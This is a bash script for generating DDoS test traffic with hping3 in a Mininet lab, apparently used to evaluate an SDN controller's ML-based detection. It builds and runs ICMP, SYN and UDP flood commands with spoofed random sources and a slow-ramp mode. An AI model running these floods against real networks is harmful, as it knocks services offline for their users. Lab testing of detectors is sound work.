#!/bin/bash

###############################################################################
# DDoS Attack Traffic Generator for SDN Detection Testing
#
# Generates controlled DDoS attack traffic using hping3 within a Mininet
# environment. Used to test the SDN controller's ML-based detection and
# mitigation capabilities.
#
# WARNING: This script is for TESTING PURPOSES ONLY within an isolated
# Mininet virtual network. Never use against production networks.
#
# Attack Types:
#   ICMP Flood - High-rate ICMP echo requests with random source IPs
#   SYN Flood  - TCP SYN packets to port 80 with random source IPs
#   UDP Flood  - UDP packets to port 53 with random source IPs
#
# Modes:
#   --no-spoof    Use real source IPs (tests source-based blocking + BCP38)
#   --slow-ramp   Gradual rate increase over 60s (tests rate-of-change features)
#
# Usage:
#   sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --duration 60
#   sudo bash attack_generator.sh --type all --target 10.0.0.7 --duration 30
#   sudo bash attack_generator.sh --type syn --target 10.0.0.7 --no-spoof
#   sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --slow-ramp
#
# Requirements:
#   - hping3 installed
#   - Root privileges (sudo)
#   - Running inside Mininet environment
#
###############################################################################

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Default configuration
DEFAULT_TARGET="10.0.0.7"
DEFAULT_DURATION=60
DEFAULT_TYPE="icmp"

# Resolved paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="${SCRIPT_DIR}/../logs"
LOG_FILE="${LOG_DIR}/attack_history.txt"

# Track background PIDs for cleanup
ATTACK_PIDS=()

###############################################################################
# Function: print_banner
###############################################################################
print_banner() {
    echo ""
    echo -e "${RED}${BOLD}"
    echo "  ============================================================"
    echo "   DDoS Attack Traffic Generator - SDN Testing Environment"
    echo "  ============================================================"
    echo -e "${NC}"
    echo -e "  ${YELLOW}WARNING: For testing in isolated Mininet networks ONLY${NC}"
    echo ""
}

###############################################################################
# Function: show_help
###############################################################################
show_help() {
    echo "Usage: sudo bash attack_generator.sh [OPTIONS]"
    echo ""
    echo "Generate DDoS attack traffic for SDN detection testing."
    echo ""
    echo "Options:"
    echo "  --type TYPE       Attack type: icmp, syn, udp, or all (default: ${DEFAULT_TYPE})"
    echo "  --target IP       Target IP address (default: ${DEFAULT_TARGET})"
    echo "  --duration SECS   Attack duration in seconds (default: ${DEFAULT_DURATION})"
    echo "  --no-spoof        Use real source IP (no --rand-source)"
    echo "  --slow-ramp       Gradual rate increase over 60s"
    echo "  --no-confirm      Skip confirmation prompt"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --duration 60"
    echo "  sudo bash attack_generator.sh --type syn --target 10.0.0.5 --duration 30"
    echo "  sudo bash attack_generator.sh --type all --target 10.0.0.7 --duration 20"
    echo "  sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --no-spoof"
    echo "  sudo bash attack_generator.sh --type syn --target 10.0.0.7 --slow-ramp"
    echo "  sudo bash attack_generator.sh --type udp --target 10.0.0.7 --no-spoof --slow-ramp"
    echo ""
    echo "Attack Types:"
    echo "  icmp   ICMP Flood  - hping3 -1 --flood --rand-source TARGET"
    echo "  syn    SYN Flood   - hping3 -S --flood -p 80 --rand-source TARGET"
    echo "  udp    UDP Flood   - hping3 --udp --flood -p 53 --rand-source TARGET"
    echo "  all    Run all three types sequentially"
    echo ""
    echo "Modes:"
    echo "  --no-spoof    Omits --rand-source; tests source-based blocking + BCP38"
    echo "  --slow-ramp   Starts at 10 pps, ramps to flood over 60s; tests pps_delta"
    echo ""
}

###############################################################################
# Function: check_root
###############################################################################
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[ERROR]${NC} This script must be run as root"
        echo "Usage: sudo bash attack_generator.sh [OPTIONS]"
        exit 1
    fi
}

###############################################################################
# Function: check_hping3
###############################################################################
check_hping3() {
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}[ERROR]${NC} hping3 is not installed"
        echo ""
        echo "Install hping3:"
        echo "  Ubuntu/Debian: sudo apt-get install hping3"
        echo "  CentOS/RHEL:   sudo yum install hping3"
        exit 1
    fi
    echo -e "${GREEN}[OK]${NC} hping3 is installed"
}

###############################################################################
# Function: init_log
# Ensure log directory and file exist
###############################################################################
init_log() {
    mkdir -p "${LOG_DIR}"

    if [ ! -f "${LOG_FILE}" ]; then
        echo "# DDoS Attack History Log" > "${LOG_FILE}"
        echo "# Format: timestamp | type | target | duration | status" >> "${LOG_FILE}"
        echo "# Generated by traffic_generation/attack_generator.sh" >> "${LOG_FILE}"
        echo "---" >> "${LOG_FILE}"
    fi
}

###############################################################################
# Function: log_attack
# Arguments: $1=type, $2=target, $3=duration, $4=status
###############################################################################
log_attack() {
    local attack_type=$1
    local target=$2
    local duration=$3
    local status=$4
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    echo "${timestamp} | ${attack_type} | ${target} | ${duration}s | ${status}" \
        >> "${LOG_FILE}"
}

###############################################################################
# Function: cleanup
# Kill all background attack processes on exit
###############################################################################
cleanup() {
    echo ""
    echo -e "${YELLOW}[STOP]${NC} Stopping attack processes..."

    # Kill tracked PIDs
    for pid in "${ATTACK_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null
            wait "$pid" 2>/dev/null
        fi
    done

    # Kill any remaining hping3 processes started by this script
    pkill -f "hping3" 2>/dev/null

    echo -e "${GREEN}[OK]${NC} All attack processes stopped"
    echo ""
}

# Register cleanup on script exit and signals
trap cleanup EXIT
trap cleanup SIGINT SIGTERM

###############################################################################
# Function: print_attack_details
# Arguments: $1=type, $2=target, $3=duration, $4=command
###############################################################################
print_attack_details() {
    local attack_type=$1
    local target=$2
    local duration=$3
    local command=$4

    echo ""
    echo -e "${MAGENTA}  ┌──────────────────────────────────────────────┐${NC}"
    echo -e "${MAGENTA}  │           ATTACK CONFIGURATION               │${NC}"
    echo -e "${MAGENTA}  ├──────────────────────────────────────────────┤${NC}"
    echo -e "${MAGENTA}  │${NC}  Type:     ${BOLD}${attack_type}${NC}"
    echo -e "${MAGENTA}  │${NC}  Target:   ${BOLD}${target}${NC}"
    echo -e "${MAGENTA}  │${NC}  Duration: ${BOLD}${duration} seconds${NC}"
    echo -e "${MAGENTA}  │${NC}  Command:  ${command}"
    echo -e "${MAGENTA}  │${NC}  Stop:     ${BOLD}Ctrl+C${NC}"
    echo -e "${MAGENTA}  └──────────────────────────────────────────────┘${NC}"
    echo ""
}

###############################################################################
# Function: confirm_attack
# Ask user for confirmation before launching attack
###############################################################################
confirm_attack() {
    local attack_type=$1
    local target=$2
    local duration=$3

    echo -e "${RED}${BOLD}"
    echo "  !! WARNING !!"
    echo -e "${NC}"
    echo -e "  You are about to launch a ${RED}${BOLD}${attack_type}${NC} attack:"
    echo -e "    Target:   ${BOLD}${target}${NC}"
    echo -e "    Duration: ${BOLD}${duration} seconds${NC}"
    echo ""
    echo -e "  ${YELLOW}This should ONLY be used in an isolated Mininet test environment.${NC}"
    echo ""

    read -r -p "  Proceed with attack? [y/N]: " response
    case "$response" in
        [yY][eE][sS]|[yY])
            return 0
            ;;
        *)
            echo -e "\n  ${BLUE}[INFO]${NC} Attack cancelled by user"
            exit 0
            ;;
    esac
}

###############################################################################
# Function: run_attack
# Arguments: $1=type, $2=target, $3=duration, $4=no_spoof, $5=slow_ramp
###############################################################################
run_attack() {
    local attack_type=$1
    local target=$2
    local duration=$3
    local no_spoof=${4:-false}
    local slow_ramp=${5:-false}
    local hping_cmd=""
    local type_label=""
    local spoof_flag="--rand-source"

    # --no-spoof mode: omit --rand-source (tests source-based blocking + BCP38)
    if [ "$no_spoof" = true ]; then
        spoof_flag=""
    fi

    # Build hping3 command based on attack type
    case "$attack_type" in
        icmp)
            type_label="ICMP Flood"
            hping_cmd="hping3 -1 --flood ${spoof_flag} ${target}"
            ;;
        syn)
            type_label="SYN Flood"
            hping_cmd="hping3 -S --flood -p 80 ${spoof_flag} ${target}"
            ;;
        udp)
            type_label="UDP Flood"
            hping_cmd="hping3 --udp --flood -p 53 ${spoof_flag} ${target}"
            ;;
        *)
            echo -e "${RED}[ERROR]${NC} Unknown attack type: ${attack_type}"
            echo "Valid types: icmp, syn, udp, all"
            exit 1
            ;;
    esac

    # Annotate mode
    local mode_label=""
    if [ "$no_spoof" = true ]; then
        mode_label="${mode_label}[no-spoof] "
    fi
    if [ "$slow_ramp" = true ]; then
        mode_label="${mode_label}[slow-ramp] "
    fi
    type_label="${mode_label}${type_label}"

    # Display attack details
    print_attack_details "${type_label}" "${target}" "${duration}" "${hping_cmd}"

    # Log attack start
    log_attack "${type_label}" "${target}" "${duration}" "STARTED"

    # Launch attack in background
    echo -e "  ${RED}[ATTACK]${NC} Launching ${BOLD}${type_label}${NC}..."
    echo -e "  ${BLUE}[INFO]${NC} Press Ctrl+C to stop early"
    echo ""

    if [ "$slow_ramp" = true ]; then
        # --slow-ramp mode: gradual rate increase over 60s
        # Tests pps_delta, bps_delta, pps_acceleration features (audit 9.7)
        local ramp_duration=60
        if [ "$duration" -lt "$ramp_duration" ]; then
            ramp_duration=$duration
        fi
        local ramp_steps=6
        local step_duration=$((ramp_duration / ramp_steps))
        local rates=(10 50 200 1000 5000 0)  # 0 = flood mode
        local step=0

        echo -e "  ${BLUE}[RAMP]${NC} Slow ramp: ${ramp_steps} steps over ${ramp_duration}s"
        for rate in "${rates[@]}"; do
            if [ $step -ge $ramp_steps ]; then
                break
            fi

            # Kill previous step's hping3
            pkill -f "hping3.*${target}" 2>/dev/null
            sleep 0.5

            if [ "$rate" -eq 0 ]; then
                # Flood mode for final step
                local step_cmd="${hping_cmd}"
            else
                # Rate-limited: replace --flood with -i u$interval
                local interval=$((1000000 / rate))  # microseconds
                local step_cmd="${hping_cmd/--flood/-i u${interval}}"
            fi

            ${step_cmd} >/dev/null 2>&1 &
            local step_pid=$!
            ATTACK_PIDS+=("$step_pid")

            echo -e "  ${YELLOW}[RAMP]${NC} Step $((step+1))/${ramp_steps}: " \
                "rate=${rate:-flood} pps (${step_duration}s)"

            sleep "$step_duration"
            step=$((step + 1))
        done

        # Continue at flood rate for remaining duration
        local remaining_flood=$((duration - ramp_duration))
        if [ "$remaining_flood" -gt 0 ]; then
            echo -e "  ${RED}[FLOOD]${NC} Full flood rate for ${remaining_flood}s"
            pkill -f "hping3.*${target}" 2>/dev/null
            sleep 0.5
            ${hping_cmd} >/dev/null 2>&1 &
            local flood_pid=$!
            ATTACK_PIDS+=("$flood_pid")
            sleep "$remaining_flood"
        fi

        # Cleanup
        pkill -f "hping3.*${target}" 2>/dev/null
        echo -e "  ${GREEN}[DONE]${NC} ${type_label} completed (${duration}s)"
        log_attack "${type_label}" "${target}" "${duration}" "COMPLETED"
        echo ""
        return
    fi

    # Standard mode: run hping3 in the background at flood rate
    ${hping_cmd} >/dev/null 2>&1 &
    local attack_pid=$!
    ATTACK_PIDS+=("$attack_pid")

    # Countdown timer showing remaining time
    local elapsed=0
    while [ $elapsed -lt "$duration" ]; do
        local remaining=$((duration - elapsed))

        # Print progress every 5 seconds
        if [ $((elapsed % 5)) -eq 0 ]; then
            echo -e "  ${RED}[ACTIVE]${NC} ${type_label} in progress... " \
                "${remaining}s remaining (PID: ${attack_pid})"
        fi

        sleep 1
        elapsed=$((elapsed + 1))

        # Check if hping3 process is still running
        if ! kill -0 "$attack_pid" 2>/dev/null; then
            echo -e "  ${YELLOW}[WARN]${NC} Attack process ended early"
            break
        fi
    done

    # Stop the attack
    if kill -0 "$attack_pid" 2>/dev/null; then
        kill "$attack_pid" 2>/dev/null
        wait "$attack_pid" 2>/dev/null
    fi

    echo -e "  ${GREEN}[DONE]${NC} ${type_label} completed (${elapsed}s)"

    # Log attack completion
    log_attack "${type_label}" "${target}" "${elapsed}" "COMPLETED"

    echo ""
}

###############################################################################
# Function: run_all_attacks
# Run all three attack types sequentially
# Arguments: $1=target, $2=duration, $3=no_spoof, $4=slow_ramp
###############################################################################
run_all_attacks() {
    local target=$1
    local duration=$2
    local no_spoof=${3:-false}
    local slow_ramp=${4:-false}

    echo -e "${BLUE}[INFO]${NC} Running all attack types sequentially"
    echo -e "${BLUE}[INFO]${NC} Duration per attack: ${duration} seconds"
    echo -e "${BLUE}[INFO]${NC} Total estimated time: $((duration * 3)) seconds"
    echo ""

    # Run each attack type with a pause between them
    local attack_num=1
    for attack_type in icmp syn udp; do
        echo -e "${BLUE}[${attack_num}/3]${NC} Starting ${attack_type} attack..."
        run_attack "${attack_type}" "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"

        # Pause between attacks (except after the last one)
        if [ $attack_num -lt 3 ]; then
            echo -e "  ${BLUE}[INFO]${NC} Pausing 5 seconds before next attack..."
            sleep 5
        fi

        attack_num=$((attack_num + 1))
    done

    echo -e "${GREEN}[COMPLETE]${NC} All attack types executed"
}

###############################################################################
# Main Script
###############################################################################
main() {
    # Default values
    local attack_type="${DEFAULT_TYPE}"
    local target="${DEFAULT_TARGET}"
    local duration="${DEFAULT_DURATION}"
    local no_confirm=false
    local no_spoof=false
    local slow_ramp=false

    # Parse command-line arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --type)
                attack_type="$2"
                shift 2
                ;;
            --target)
                target="$2"
                shift 2
                ;;
            --duration)
                duration="$2"
                shift 2
                ;;
            --no-spoof)
                no_spoof=true
                shift
                ;;
            --slow-ramp)
                slow_ramp=true
                shift
                ;;
            --no-confirm)
                no_confirm=true
                shift
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                echo -e "${RED}[ERROR]${NC} Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done

    # Validate attack type
    case "$attack_type" in
        icmp|syn|udp|all)
            ;;
        *)
            echo -e "${RED}[ERROR]${NC} Invalid attack type: ${attack_type}"
            echo "Valid types: icmp, syn, udp, all"
            exit 1
            ;;
    esac

    # Validate duration is a positive integer
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || [ "$duration" -le 0 ]; then
        echo -e "${RED}[ERROR]${NC} Duration must be a positive integer"
        exit 1
    fi

    # Validate target IP format (basic check)
    if ! [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[ERROR]${NC} Invalid IP address format: ${target}"
        exit 1
    fi

    # Print banner
    print_banner

    # Check prerequisites
    check_root
    check_hping3

    # Initialize logging
    init_log

    # Request confirmation (unless --no-confirm)
    if [ "$no_confirm" = false ]; then
        if [ "$attack_type" = "all" ]; then
            confirm_attack "ALL ATTACKS (ICMP + SYN + UDP)" "${target}" \
                "$((duration * 3)) total (${duration} each)"
        else
            confirm_attack "${attack_type^^} FLOOD" "${target}" "${duration}"
        fi
    fi

    echo ""
    echo -e "${BLUE}[INFO]${NC} Attack log: ${LOG_FILE}"
    echo ""

    # Execute attack(s)
    if [ "$attack_type" = "all" ]; then
        run_all_attacks "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"
    else
        run_attack "${attack_type}" "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"
    fi

    # Final summary
    echo "============================================================"
    echo -e "${GREEN}[SUMMARY]${NC} Attack generation complete"
    echo -e "  Type:     ${attack_type}"
    echo -e "  Target:   ${target}"
    echo -e "  Log file: ${LOG_FILE}"
    echo ""
    echo -e "  Check detection results:"
    echo -e "    cat ../logs/attacks_log.csv"
    echo ""
}

# Execute main function with all arguments
main "$@"
